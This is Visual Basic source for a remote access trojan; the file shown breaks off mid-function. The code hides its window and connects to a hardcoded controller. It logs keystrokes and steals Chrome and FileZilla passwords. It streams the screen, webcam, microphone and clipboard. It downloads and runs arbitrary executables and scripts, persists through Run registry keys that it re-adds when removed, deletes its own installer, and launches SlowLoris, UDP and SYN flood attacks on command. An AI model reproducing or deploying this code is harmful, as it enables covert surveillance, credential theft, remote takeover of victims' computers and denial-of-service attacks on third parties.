﻿Imports System.Windows
Imports System
Imports System.Windows.Forms
Imports System.Windows.Forms.Form
Imports Microsoft.VisualBasic
Imports System.Reflection
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Management
Imports System.Text.RegularExpressions
Imports System.Text
Imports Microsoft.Win32
Imports System.Net.NetworkInformation
Imports System.Drawing
Imports System.ServiceProcess

Namespace MyApp
    Public Class EntryPoint
        Public Shared Sub Main(args As [String]())
            Dim FrmMain As New Form1
            FrmMain.Size = New System.Drawing.Size(0, 0)
            FrmMain.ShowInTaskbar = False
            FrmMain.Visible = False
            FrmMain.Opacity = 0
            System.Windows.Forms.Application.Run(FrmMain)
        End Sub
    End Class
    Public Class Form1
        Inherits System.Windows.Forms.Form
        Dim client As TcpClient
        Dim Connection As Thread
        Dim enckey As String = "magic_key"
        Dim screensending As Thread
        Dim comp As Long
        Dim res As String
        Private Declare Function SetCursorPos Lib "user32" (ByVal X As Integer, ByVal Y As Integer) As Integer
        Public Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
        Private Const MOUSEEVENTF_LEFTDOWN As Object = &H2
        Private Const MOUSEEVENTF_LEFTUP As Object = &H4
        Private Const MOUSEEVENTF_RIGHTDOWN As Object = &H8
        Private Const MOUSEEVENTF_RIGHTUP As Object = &H10
        Dim sl As New SlowLoris
        Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
        Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
        Dim WithEvents logger As New Keylogger
        Dim logs As String
        Dim strin As String
        Dim curntdir2 As String
        Dim listviewfiles As New ListView
        Dim tbmessage As New TextBox
        Dim rtblogs As New RichTextBox
        Dim chat As New Form
        Dim discomousing As Thread
#Region "Fun Declerations"
        Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
        Private Const SETDESKWALLPAPER As Integer = 20
        Private Const UPDATEINIFILE As Long = &H1
        Declare Function GetDesktopWindow Lib "user32" () As Long
        Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Integer) As Long
        Public Const WM_SYSCOMMAND As Long = &H112&
        Public Const SC_SCREENSAVE As Long = &HF140&
        Private Declare Function SwapMouseButton& Lib "user32" (ByVal bSwap As Long)
        Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Integer, ByVal lpvParam As Long, ByVal fuWinIni As Long) As Long
        Declare Function mciSend Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpszCommand As String, ByVal lpszReturnString As String, ByVal cchReturnLength As Long, ByVal hwndCallback As Long) As Long
        Private Declare Function FindWindow Lib "user32.dll" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Int32
        Private Declare Function ShowWindow Lib "user32.dll" (ByVal hwnd As IntPtr, ByVal nCmdShow As Int32) As Int32
        Private Const SW_HIDE As Int32 = 0
        Private Const SW_RESTORE As Int32 = 9
        Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
        Private Const SWP_HIDEWINDOW As Long = &H80
        Private Const SWP_SHOWWINDOW As Long = &H40
#End Region
        <DllImport("winmm.dll")>
        Private Shared Function mciSendString(ByVal command As String, ByVal buffer As StringBuilder, ByVal bufferSize As Integer, ByVal hwndCallback As IntPtr) As Integer
        End Function
#Region "Webcam Declerations"
        Dim picCapture As New PictureBox
        Const WM_CAP As Short = &H400S
        Const WM_CAP_DRIVER_CONNECT As Integer = WM_CAP + 10
        Const WM_CAP_DRIVER_DISCONNECT As Integer = WM_CAP + 11
        Const WM_CAP_EDIT_COPY As Integer = WM_CAP + 30
        Const WM_CAP_SET_PREVIEW As Integer = WM_CAP + 50
        Const WM_CAP_SET_PREVIEWRATE As Integer = WM_CAP + 52
        Const WM_CAP_SET_SCALE As Integer = WM_CAP + 53
        Const WS_CHILD As Integer = &H40000000
        Const WS_VISIBLE As Integer = &H10000000
        Const SWP_NOMOVE As Short = &H2S
        Const SWP_NOSIZE As Short = 1
        Const SWP_NOZORDER As Short = &H4S
        Const HWND_BOTTOM As Short = 1
        Dim iDevice As Integer = 0
        Dim hHwnd As Integer
        Declare Function SendWebcam Lib "user32" Alias "SendMessageA" (ByVal hwnd As Integer, ByVal wMsg As Integer, ByVal wParam As Integer, ByVal lParam As Object) As Integer
        Declare Function SetWebcamPos Lib "user32" Alias "SetWindowPos" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
        Declare Function DestroyWebcam Lib "user32" (ByVal hndw As Integer) As Boolean
        Declare Function capCreateCaptureWindowA Lib "avicap32.dll" (ByVal lpszWindowName As String, ByVal dwStyle As Integer, ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer, ByVal nHeight As Short, ByVal hWndParent As Integer, ByVal nID As Integer) As Integer
        Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, ByVal cbVer As Integer) As Boolean
        Dim webcamsending As Thread
#End Region
        Dim installenable, dropinsubfolder, startupenable, startupdir, startupuser, startuplocal, regpersistence, melt, delay As Boolean
        Dim dropsubfoldername, dropname, path As String
        Dim delaytime As Integer
        Dim WithEvents reg As New RegistryWatcher
        Dim objMutex As Mutex
        Sub New()
            logger.CreateHook()
        End Sub
#Region "Connection"
        Sub Connect()
TryAgain:
            Try
                client = New TcpClient("192.168.1.102", 5000)
                Send(AES_Encrypt("NewConnection|" & GetInfo() & "|" & SystemInformation.UserName.ToString() & "|" & SystemInformation.ComputerName.ToString() & "|" & My.Computer.Info.OSFullName & "|" & My.Computer.Info.OSVersion & "|" & getpriv(), enckey))
                client.GetStream().BeginRead(New Byte() {0}, 0, 0, AddressOf Read, Nothing)
            Catch ex As Exception
                GoTo TryAgain
            End Try
        End Sub
        Sub Read(ByVal ar As IAsyncResult)
            Dim message As String
            Try
                Dim reader As New StreamReader(client.GetStream())
                message = reader.ReadLine()
                message = AES_Decrypt(message, enckey)
                parse(message)
                client.GetStream().BeginRead(New Byte() {0}, 0, 0, AddressOf Read, Nothing)
            Catch ex As Exception
                Threading.Thread.Sleep(4000)
                Connect()
            End Try
        End Sub
        Public Sub Send(ByVal message As String)
            Try
                Dim writer As New StreamWriter(client.GetStream())
                writer.WriteLine(message)
                writer.Flush()
            Catch
            End Try
        End Sub
        Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
            Try
                objMutex = New Mutex(False, "SINGLE_INSTANCE_APP_MUTEX")
                If objMutex.WaitOne(0, False) = False Then
                    objMutex.Close()
                    objMutex = Nothing
                    Application.ExitThread()
                    End
                End If

                installenable = False
                dropinsubfolder = False
                dropsubfoldername = "VJKFZGUIZG"
                startupenable = False
                startupdir = False
                startupuser = False
                startuplocal = False
                regpersistence = False
                melt = False
                delay = False
                dropname = "GUER"
                path = "HFFguD"
                delaytime = 0

                If delay = True Then
                    System.Threading.Thread.Sleep(delaytime * 1000)
                End If

                If Application.ExecutablePath.Contains("Temp") Or Application.ExecutablePath.Contains("AppData") Or Application.ExecutablePath.Contains("Program") Then
                    GoTo 1
                End If

                If installenable = True Then
                    If dropinsubfolder = True Then
                        If Not My.Computer.FileSystem.DirectoryExists(getPath(path) & "\" & dropsubfoldername) Then
                            My.Computer.FileSystem.CreateDirectory(getPath(path) & "\" & dropsubfoldername)
                        End If
                        IO.File.WriteAllBytes(getPath(path) & "\" & dropsubfoldername & "\" & dropname, IO.File.ReadAllBytes(Application.ExecutablePath))
                        domelt(getPath(path) & "\" & dropsubfoldername & "\" & dropname)
                        Exit Sub
                    Else
                        IO.File.WriteAllBytes(getPath(path) & "\" & dropname, IO.File.ReadAllBytes(Application.ExecutablePath))
                        domelt(getPath(path) & "\" & dropname)
                        Exit Sub
                    End If
                End If

1:              If startupenable = True Then
                    If startupdir = True Then
                        Dim nam As String = New IO.FileInfo(Application.ExecutablePath).Name
                        IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Startup).ToString & "\" & nam, IO.File.ReadAllBytes(Application.ExecutablePath))
                    ElseIf startupuser = True Then
                        Dim regkey As RegistryKey
                        regkey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                        regkey.SetValue(New IO.FileInfo(Application.ExecutablePath).Name.Replace(".exe", ""), Chr(34) & Application.ExecutablePath & Chr(34))
                    ElseIf startuplocal = True Then
                        Dim regkey As RegistryKey
                        regkey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                        regkey.SetValue(New IO.FileInfo(Application.ExecutablePath).Name.Replace(".exe", ""), Chr(34) & Application.ExecutablePath & Chr(34))
                        If regpersistence = True Then
                            reg.AddWatcher(RegistryWatcher.HKEY_ROOTS.HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", New IO.FileInfo(Application.ExecutablePath).Name.Replace(".exe", ""))
                        End If
                    End If
                End If

                If melt = True Then
                    SetAttr(Application.ExecutablePath, FileAttribute.Hidden)
                End If

                Connection = New Thread(AddressOf Connect)
                Connection.Start()
            Catch
            End Try
        End Sub
        Sub parse(ByVal msg As String)
            Try
                If msg = "Disconnected" Then
                    Connection.Abort()
                    Connection = New Thread(AddressOf Connect)
                    Connection.Start()
                ElseIf msg = "SystemInformation" Then
                    Send(AES_Encrypt("SystemInformation|" & getsystem() & GetDeepInfo(), enckey))
                ElseIf msg = "GetProcess" Then
                    sendprocess()
                ElseIf msg.StartsWith("Kill") Then
                    KillProcesses(msg)
                ElseIf msg.StartsWith("New") Then
                    System.Diagnostics.Process.Start(msg.Split("|")(1))
                ElseIf msg = "Software" Then
                    getinstalledsoftware()
                ElseIf msg.StartsWith("RD") Then
                    comp = msg.Split("|")(1)
                    res = msg.Split("|")(2)
                    screensending = New Thread(AddressOf sendscreen)
                    screensending.Start()
                ElseIf msg = "Stop" Then
                    screensending.Abort()
                ElseIf msg = "GetPcBounds" Then
                    Send(AES_Encrypt("PCBounds" & My.Computer.Screen.Bounds.Height & "x" & My.Computer.Screen.Bounds.Width, enckey))
                ElseIf msg.Contains("SetCurPos") Then
                    MouseMov(msg)
                ElseIf msg.StartsWith("OpenWebsite") Then
                    openwebsite(msg.Replace("OpenWebsite", ""))
                ElseIf msg.StartsWith("DandE") Then
                    dande(msg.Replace("DandE", ""))
                ElseIf msg.StartsWith("MSG") Then
                    MessageBox.Show(GetBetween(msg, "Body: ", " Icon:", 0), GetBetween(msg, "Title: ", " Body:", 0), MessageBoxButton(GetBetween(msg, "Button: ", " End", 0)), MessageBoxIcn(GetBetween(msg, "Icon: ", " Button:", 0)))
                ElseIf msg = "GetHostsFile" Then
                    loadhostsfile()
                ElseIf msg.StartsWith("SaveHostsFile") Then
                    savehostsfile(msg.Replace("SaveHostsFile", ""))
                ElseIf msg = "GetCPImage" Then
                    getclipboardimage()
                ElseIf msg = "GetCPText" Then
                    getclipboardtext()
                ElseIf msg.StartsWith("SaveCPText") Then
                    setclipboardtext(msg.Replace("SaveCPText", ""))
                ElseIf msg.StartsWith("Shell") Then
                    runshell(msg.Replace("Shell", ""))
                ElseIf msg = "GetKeyLogs" Then
                    Send(AES_Encrypt("KeyLogs" & logs, enckey))
                ElseIf msg = "DelKeyLogs" Then
                    logs = ""
                ElseIf msg = "RecordingStart" Then
                    audio_start()
                ElseIf msg = "RecordingStop" Then
                    audio_stop()
                ElseIf msg = "RecordingDownload" Then
                    audio_get()
                ElseIf msg = "GetPasswords" Then
                    Main.GetChrome()
                    Send(AES_Encrypt("Passwords" & Main.lol & FileZilla(), enckey))
                ElseIf msg = "GetTCPConnections" Then
                    Send(AES_Encrypt("TCPConnections" & GetTCPConnections(), enckey))
                ElseIf msg.StartsWith("GetStartup") Then
                    GetStartupEntries()
                ElseIf msg.StartsWith("UpdateFromLink") Then
                    UpdatefromLink(msg.Replace("UpdateFromLink", ""))
                ElseIf msg.StartsWith("UpdatefromFile") Then
                    UpdateFromFile(msg.Replace("UpdatefromFile", ""))
                ElseIf msg.StartsWith("ExecuteFromLink") Then
                    ExecutefromLink(msg.Replace("ExecuteFromLink", ""))
                ElseIf msg.StartsWith("ExecutefromFile") Then
                    ExecutefromFile(msg.Replace("ExecutefromFile", ""))
                ElseIf msg = "Restart" Then
                    rstart()
                ElseIf msg = "Uninstall" Then
                    delete(3)
                ElseIf msg.StartsWith("RemovefromStartup") Then
                    removefromstartup(msg.Replace("RemovefromStartup", ""))
                ElseIf msg = "ListDrives" Then
                    listdrives()
                ElseIf msg.StartsWith("ListFiles") Then
                    showfiles(msg.Replace("ListFiles", ""))
                ElseIf msg.Contains("mkdir") Then
                    createnewdirectory(msg.Replace("mkdir", ""))
                ElseIf msg.Contains("rmdir") Then
                    deletedirectory(msg.Replace("rmdir", ""))
                ElseIf msg.Contains("rnfolder") Then
                    renamedirectory(msg.Replace("rnfolder", "").Split("|")(0), msg.Replace("rnfolder", "").Split("|")(1))
                ElseIf msg.Contains("mvdir") Then
                    movedirectory(msg.Replace("mvdir", "").Split("|")(0), msg.Replace("mvdir", "").Split("|")(1), msg.Replace("mvdir", "").Split("|")(2))
                ElseIf msg.Contains("cpdir") Then
                    copydirectory(msg.Replace("cpdir", "").Split("|")(0), msg.Replace("cpdir", "").Split("|")(1), msg.Replace("cpdir", "").Split("|")(2))
                ElseIf msg.Contains("mkfile") Then
                    CreateNewFile(msg)
                ElseIf msg.Contains("rmfile") Then
                    deletefile(msg.Replace("rmfile", "").Split("|")(0))
                ElseIf msg.Contains("rnfile") Then
                    renamefile(msg.Replace("rnfile", "").Split("|")(0), msg.Replace("rnfile", "").Split("|")(1))
                ElseIf msg.Contains("movefile") Then
                    movefile(msg.Replace("movefile", "").Split("|")(0), msg.Replace("movefile", "").Split("|")(1), msg.Replace("move", "").Split("|")(2))
                ElseIf msg.Contains("copyfile") Then
                    copyfile(msg.Replace("copyfile", "").Split("|")(0), msg.Replace("copyfile", "").Split("|")(1), msg.Replace("copyfile", "").Split("|")(2))
                ElseIf msg.StartsWith("sharefile") Then
                    sharefile(msg.Replace("sharefile", ""))
                ElseIf msg.StartsWith("FileUpload") Then
                    UploadFile(msg.Replace("FileUpload", ""))
                ElseIf msg = "ListWebcamDevices" Then
                    listdevices()
                ElseIf msg = "WebcamStart" Then
                    webcamsending = New Thread(AddressOf getwebcam)
                    webcamsending.Start()
                ElseIf msg.StartsWith("SlowLorisStart") Then
                    StartSlowLoris(msg.Replace("SlowLorisStart", ""))
                ElseIf msg.StartsWith("SlowLorisStop") Then
                    sl.StopFlood()
                ElseIf msg.StartsWith("UDPStart") Then
                    StartUDP(msg.Replace("UDPStart", ""))
                ElseIf msg = "UDPStop" Then
                    If UDPFlood.FloodRunning = True Then
                        UDPFlood.StopUDPFlood()
                    End If
                ElseIf msg.StartsWith("SYNStart") Then
                    StartSYN(msg.Replace("SYNStart", ""))
                ElseIf msg = "SYNStop" Then
                    If SynFlood.IsRunning = True Then
                        SynFlood.StopSynFlood()
                    End If
                ElseIf msg.StartsWith("HTMLScripting") Then
                    IO.File.WriteAllText(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\FBqINhRdpgnqATxJ.html", msg.Replace("HTMLScripting", ""))
                    System.Diagnostics.Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\FBqINhRdpgnqATxJ.html")
                ElseIf msg.StartsWith("VBSScripting") Then
                    IO.File.WriteAllText(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\UjfAPUFPaUkAqQTZ.vbs", msg.Replace("VBSScripting", ""))
                    System.Diagnostics.Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\UjfAPUFPaUkAqQTZ.vbs")
                ElseIf msg.StartsWith("BATScripting") Then
                    IO.File.WriteAllText(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\X53DNwMsMwjtC9JW.bat", msg.Replace("BATScripting", ""))
                    System.Diagnostics.Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\X53DNwMsMwjtC9JW.bat")
                ElseIf msg.StartsWith("GetThumbNails") Then
                    SendThumbNail()
                ElseIf msg.Contains("Website") Then
                    openwebsite(msg.Split("|")(1))
                ElseIf msg.Contains("logoff") Then
                    Shell("shutdown /l")
                ElseIf msg.Contains("shutdwn") Then
                    Shell("shutdown /s")
                ElseIf msg.Contains("restrt") Then
                    Shell("shutdown /r")
                ElseIf msg.Contains("Change") Then
                    My.Computer.Network.DownloadFile(msg.Split("|")(0), My.Computer.FileSystem.SpecialDirectories.Temp.ToString & "\wallpaper.jpg")
                    SystemParametersInfo(SETDESKWALLPAPER, 0, My.Computer.FileSystem.SpecialDirectories.Temp.ToString & "\wallpaper.jpg", UPDATEINIFILE)
                ElseIf msg.Contains("Spk") Then
                    Dim SAPI As Object
                    SAPI = CreateObject("SAPI.spvoice")
                    SAPI.Speak(msg.Split("|")(1).ToString)
                ElseIf msg.Contains("UndoMouse") Then
                    SwapMouseButton(False)
                ElseIf msg.Contains("SwapMouse") Then
                    SwapMouseButton(True)
                ElseIf msg = "CloseCD" Then
                    mciSend("set CDAudio door closed", 0, 0, 0)
                ElseIf msg = "OpenCD" Then
                    mciSend("set CDAudio door open", 0, 0, 0)
                ElseIf msg.Contains("ShowIcons") Then
                    Dim hWnd As IntPtr
                    hWnd = FindWindow(vbNullString, "Program Manager")
                    If Not hWnd = 0 Then
                        ShowWindow(hWnd, SW_RESTORE)
                    End If
                ElseIf msg.Contains("HideIcons") Then
                    Dim hWnd As IntPtr
                    hWnd = FindWindow(vbNullString, "Program Manager")
                    If Not hWnd = 0 Then
                        ShowWindow(hWnd, SW_HIDE)
                    End If
                ElseIf msg.Contains("ShowTaskbar") Then
                    ShowTaskBar()
                ElseIf msg.Contains("HideTaskbar") Then
                    HideTaskBar()
                ElseIf msg = "StartDiscoMouse" Then
                    discomousing = New Thread(AddressOf discomouse)
                    discomousing.Start()
                ElseIf msg = "StopDiscoMouse" Then
                    discomousing.Abort()
                ElseIf msg = "WebcamStop" Then
                    webcamsending.Abort()
                ElseIf msg = "GetServices" Then
                    SendServices()
                ElseIf msg.StartsWith("ServiceAction") Then
                    Dim res As String = msg.Replace("ServiceAction", "")
                    PerformServiceAction(res.Split("|")(0), res.Split("|")(1))
                End If
            Catch
            End Try
        End Sub
        Function getPath(ByVal input As String) As String
            Select Case input
                Case "Appdata Local"
                    Return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString()
                Case "Appdata Roaming"
                    Return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString()
                Case "Temp"
                    Return My.Computer.FileSystem.SpecialDirectories.Temp.ToString()
                Case "Program Files"
                    Return Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).ToString()
                Case "Programs"
                    Return Environment.GetFolderPath(Environment.SpecialFolder.Programs).ToString()
                Case Else : Return Nothing
            End Select
        End Function
        Sub domelt(ByVal path As String)
            Try
                Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
                p.Arguments = "/C ping 1.1.1.1 -n 1 -w " & 3 & " > Nul & Del " & ControlChars.Quote & Application.ExecutablePath & ControlChars.Quote & "&" & ControlChars.Quote & path & ControlChars.Quote
                p.CreateNoWindow = True
                p.ErrorDialog = False
                p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
                System.Diagnostics.Process.Start(p)
                Application.Exit()
            Catch
            End Try
        End Sub
        Private Sub reg_RegistryChanged(M As RegistryWatcher.Monitor) Handles reg.RegistryChanged
            Try
                Dim regkey As RegistryKey
                regkey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                regkey.SetValue(New IO.FileInfo(Application.ExecutablePath).Name.Replace(".exe", ""), Chr(34) & Application.ExecutablePath & Chr(34))
            Catch
            End Try
        End Sub
#End Region
#Region "Others"
        Sub discomouse()
            Try
                Do
                    Dim mousepos As New System.Drawing.Point
                    mousepos.X = New Random().Next(0, My.Computer.Screen.Bounds.Height)
                    mousepos.Y = New Random().Next(0, My.Computer.Screen.Bounds.Width)
                    System.Windows.Forms.Cursor.Position = mousepos
                Loop
            Catch
            End Try
        End Sub
        Sub KillProcesses(ByVal txt As String)
            Try
                txt = txt.Replace("Kill|", "")

                For i As Integer = 0 To CountCharacter(txt, "|")
                    System.Diagnostics.Process.GetProcessesByName(txt.Split("|")(i).Remove(txt.Split("|")(i).Length - 4, 4))(0).CloseMainWindow()
                Next
            Catch
            End Try
        End Sub
        Public Function CountCharacter(ByVal value As String, ByVal ch As Char) As Integer
            Try
                Dim cnt As Integer = 0
                For Each c As Char In value
                    If c = ch Then cnt += 1
                Next
                Return cnt
            Catch
                Return Nothing
            End Try
        End Function
        Sub openwebsite(ByVal url As String)
            Try
                System.Diagnostics.Process.Start(url)
            Catch : End Try
        End Sub
        Sub dande(ByVal url As String)
            Try
                Dim web As New WebClient
                web.DownloadFile(url, My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\file.exe")
                Shell(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\file.exe")
            Catch
            End Try
        End Sub
        Private Function GetBetween(ByVal input As String, ByVal str1 As String, ByVal str2 As String, ByVal index As Integer) As String
            Dim temp As String = Regex.Split(input, str1)(index + 1)
            Return Regex.Split(temp, str2)(0)
        End Function
        Function MessageBoxButton(ByVal Text As String) As Object
            Select Case Text
                Case "AbortRetryIgnore"
                    Return MessageBoxButtons.AbortRetryIgnore
                Case "OK"
                    Return MessageBoxButtons.OK
                Case "OKCancel"
                    Return MessageBoxButtons.OKCancel
                Case "RetryCancel"
                    Return MessageBoxButtons.RetryCancel
                Case "YesNo"
                    Return MessageBoxButtons.YesNo
                Case "YesNoCancel"
                    Return MessageBoxButtons.YesNoCancel
                Case Else
                    Return MessageBoxButtons.OK
            End Select
        End Function
        Function MessageBoxIcn(ByVal text As String) As Object
            Select Case text
                Case "Asterisk"
                    Return MessageBoxIcon.Asterisk
                Case "Error"
                    Return MessageBoxIcon.Error
                Case "Exclamation"
                    Return MessageBoxIcon.Exclamation
                Case "Hand"
                    Return MessageBoxIcon.Hand
                Case "Information"
                    Return MessageBoxIcon.Information
                Case "None"
                    Return MessageBoxIcon.None
                Case "Question"
                    Return MessageBoxIcon.Question
                Case "Stop"
                    Return MessageBoxIcon.Stop
                Case "Warning"
                    Return MessageBoxIcon.Warning
                Case Else
                    Return MessageBoxIcon.None
            End Select
        End Function
        Sub UpdatefromLink(ByVal url As String)
            Try
                My.Computer.Network.DownloadFile(url, My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\updated.exe")
                Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
                p.Arguments = "/C ping 1.1.1.1 -n 1 -w 5 > Nul & Del " & ControlChars.Quote & Application.ExecutablePath & ControlChars.Quote
                p.CreateNoWindow = True
                p.ErrorDialog = False
                p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden

                Dim pp As New System.Diagnostics.ProcessStartInfo("cmd.exe")
                pp.Arguments = "/C ping 1.1.1.1 -n 1 -w 5 > Nul & " & ControlChars.Quote & My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\updated.exe" & ControlChars.Quote
                pp.CreateNoWindow = True
                pp.ErrorDialog = False
                pp.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden

                System.Diagnostics.Process.Start(p)
                System.Diagnostics.Process.Start(pp)

                Application.Exit()
            Catch
            End Try
        End Sub
        Sub UpdateFromFile(ByVal txt As String)
            Try
                File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\updated.exe", Convert.FromBase64String(txt))
                Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
                p.Arguments = "/C ping 1.1.1.1 -n 1 -w 5 > Nul & Del " & ControlChars.Quote & Application.ExecutablePath & ControlChars.Quote
                p.CreateNoWindow = True
                p.ErrorDialog = False
                p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden

                Dim pp As New System.Diagnostics.ProcessStartInfo("cmd.exe")
                pp.Arguments = "/C ping 1.1.1.1 -n 1 -w 5 > Nul & " & ControlChars.Quote & My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\updated.exe" & ControlChars.Quote
                pp.CreateNoWindow = True
                pp.ErrorDialog = False
                pp.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden

                System.Diagnostics.Process.Start(p)
                System.Diagnostics.Process.Start(pp)

                Application.Exit()
            Catch
            End Try
        End Sub
        Sub ExecutefromLink(ByVal url As String)
            Try
                My.Computer.Network.DownloadFile(url, My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\exec.exe")
                Shell(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\exec.exe")
            Catch
            End Try
        End Sub
        Sub ExecutefromFile(ByVal txt As String)
            Try
                File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\exec.exe", Convert.FromBase64String(txt))
                Shell(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\exec.exe")
            Catch
            End Try
        End Sub
        Sub rstart()
            Try
                Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
                p.Arguments = "/C ping 1.1.1.1 -n 1 -w 15 > Nul & " & ControlChars.Quote & Application.ExecutablePath & ControlChars.Quote
                p.CreateNoWindow = True
                p.ErrorDialog = False
                p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
                System.Diagnostics.Process.Start(p)
                Application.Exit()
            Catch
            End Try
        End Sub
        Sub delete(ByVal timeout As Integer)
            Try
                SetAttr(Application.ExecutablePath, FileAttribute.Normal)
                Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
                p.Arguments = "/C ping 1.1.1.1 -n 1 -w " & timeout & " > Nul & Del " & ControlChars.Quote & Application.ExecutablePath & ControlChars.Quote
                p.CreateNoWindow = True
                p.ErrorDialog = False
                p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden

                If startuplocal = True Then
                    Dim regkey As RegistryKey
                    regkey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                    If regpersistence = True Then
                        reg.RemoveWatcher(New IO.FileInfo(Application.ExecutablePath).Name.Replace(".exe", ""))
                    End If
                    regkey.DeleteValue(New IO.FileInfo(Application.ExecutablePath).Name.Replace(".exe", ""))
                End If

                If startupuser = True Then
                    Dim regkey As RegistryKey
                    regkey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                    regkey.DeleteValue(New IO.FileInfo(Application.ExecutablePath).Name.Replace(".exe", ""))
                End If

                System.Diagnostics.Process.Start(p)
                Application.Exit()
            Catch ex As Exception
                MsgBox(ex.Message)
            End Try
        End Sub
        Sub removefromstartup(ByVal txt As String)
            Try
                If txt.StartsWith("C") Then
                    IO.File.Delete(txt.Replace("|", ""))
                ElseIf txt.StartsWith("HKEY_CURRENT_USER") Then
                    txt = txt.Replace(txt.Split("\")(0) & "\", "")
                    Dim name As String = txt.Split("|")(1)
                    txt = txt.Replace("\|" & txt.Split("|")(1), "")
                    Dim regkey As RegistryKey = Registry.CurrentUser.OpenSubKey(txt, True)
                    regkey.DeleteValue(name)
                    regkey.Close()
                ElseIf txt.StartsWith("HKEY_LOCAL_MACHINE") Then
                    txt = txt.Replace(txt.Split("\")(0) & "\", "")
                    Dim name As String = txt.Split("|")(1)
                    txt = txt.Replace("\|" & txt.Split("|")(1), "")
                    Dim regkey As RegistryKey = Registry.LocalMachine.OpenSubKey(txt, True)
                    regkey.DeleteValue(name)
                    regkey.Close()
                End If
            Catch
            End Try
        End Sub
        Sub UploadFile(ByVal txt As String)
            Try
                'MsgBox(txt.Split("|")(0))
                'IO.File.WriteAllBytes(txt.Split("|")(0), Convert.FromBase64String(txt.Replace(txt.Split("|")(0) & "|", "")))
            Catch
            End Try
        End Sub
        Sub StartSlowLoris(ByVal params As String)
            Try
                sl.Target = params.Split("|")(0)
                sl.AOSockets = params.Split("|")(1)
                sl.AOThreads = params.Split("|")(2)
                sl.Start()
            Catch
            End Try
        End Sub
        Sub StartUDP(ByVal params As String)
            Try
                If UDPFlood.FloodRunning = True Then
                    Exit Sub
                Else
                    UDPFlood.Host = params.Split("|")(0)
                    UDPFlood.Port = params.Split("|")(1)
                    UDPFlood.Threads = params.Split("|")(2)
                    UDPFlood.StartUDPFlood()
                End If
            Catch
            End Try
        End Sub
        Sub StartSYN(ByVal params As String)
            Try
                If SynFlood.IsRunning = True Then
                    Exit Sub
                Else
                    SynFlood.Host = params.Split("|")(0)
                    SynFlood.Port = params.Split("|")(1)
                    SynFlood.SynSockets = params.Split("|")(2)
                    SynFlood.Threads = params.Split("|")(3)
                    SynFlood.StartSynFlood()
                End If
            Catch
            End Try
        End Sub
        Public Function HideTaskBar() As Boolean
            Try
                Dim lRet As Long
                lRet = FindWindow("Shell_traywnd", "")
                If lRet > 0 Then
